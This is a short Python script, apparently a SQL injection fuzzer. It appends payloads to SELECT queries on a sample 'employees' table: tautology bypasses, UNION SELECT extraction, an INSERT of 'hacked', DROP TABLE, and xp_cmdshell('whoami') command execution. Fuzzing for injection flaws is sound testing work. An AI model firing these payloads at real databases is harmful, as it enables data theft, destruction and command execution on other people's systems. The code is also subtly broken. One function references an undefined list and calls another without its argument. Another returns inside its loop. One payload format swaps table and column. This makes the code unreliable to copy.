from table_info import Table_info
import random

simple_injection_suffixes = [
  "1' OR '1'='1",
  "1' OR '1'='1' -- ", 
  "' OR ''='",
  "0; EXEC xp_cmdshell('whoami'); --",
  "1' AND 1=0 UNION ALL SELECT NULL, NULL, NULL -- ",
]

table_specific_injection_suffixes = [
  "1'; DROP TABLE {}; --",
]

table_column_specific_injection_suffixes = [
  "1' UNION SELECT {} FROM {}; --",
  "'; INSERT INTO {} ({}) VALUES ('hacked'); --",
]


def generate_fuzzing_queries(table_info_list):

  benign_queries = generate_benign_queries()
  injection_queries = []
  
  for table_info in table_info_list:
    table_name = table_info.table_name
    columns = table_info.columns_names
    
    injection_queries.append(f"SELECT * FROM {table_name};")

    for payload in injection_suffixes:
      if "{}" in payload:
        if "{table_name}" in payload:
          injection_queries.append(payload.format(table_name))
        elif "{columns}" in payload and columns:
          col_str = ', '.join(columns)
          injection_queries.append(payload.format(col_str, table_name))
        else:
          injection_queries.append(payload.format(table_name))
      else:
        # Simple fuzz queries
        injection_queries.append(f"SELECT * FROM {table_name} WHERE {columns[0]} = '{payload}';" if columns else "")
  
  return injection_queries



def generate_benign_queries(table_info: Table_info) -> list[str]:
    
  table_name = table_info.table_name
  column_names = table_info.columns_names  
  benign_queries: list[str] = []

  #benign_queries.append(f'SELECT * FROM {table_name};')
  for column_name in column_names:
    
    benign_queries.append(f'SELECT {column_name} FROM {table_name} WHERE {column_name}=')

  return benign_queries

def generate_injection_queries(table_info: Table_info, benign_queries: list[str]):

  table_name = table_info.table_name
  column_names = table_info.columns_names
  injection_queries = []
  for benign_query in benign_queries:

    for injection_suffixe in simple_injection_suffixes:

      injection_queries.append(benign_query + injection_suffixe + ';')
    for injection_suffixe in table_specific_injection_suffixes:

      injection_queries.append(benign_query + injection_suffixe.format(table_name) + ';')
    for injection_suffixe in table_column_specific_injection_suffixes:

      for column_name in column_names:
        injection_queries.append(benign_query + injection_suffixe.format(table_name, column_name) + ';')
    return injection_queries


table_name = 'employees'
column_names = [
  'first_name',
  'last_name',
  'department',
  'salary'
]
table_info = Table_info(table_name, column_names)
benign_queries = generate_benign_queries(table_info)
injection_queries = generate_injection_queries(table_info, benign_queries)
for injection_query in injection_queries:
  print(injection_query)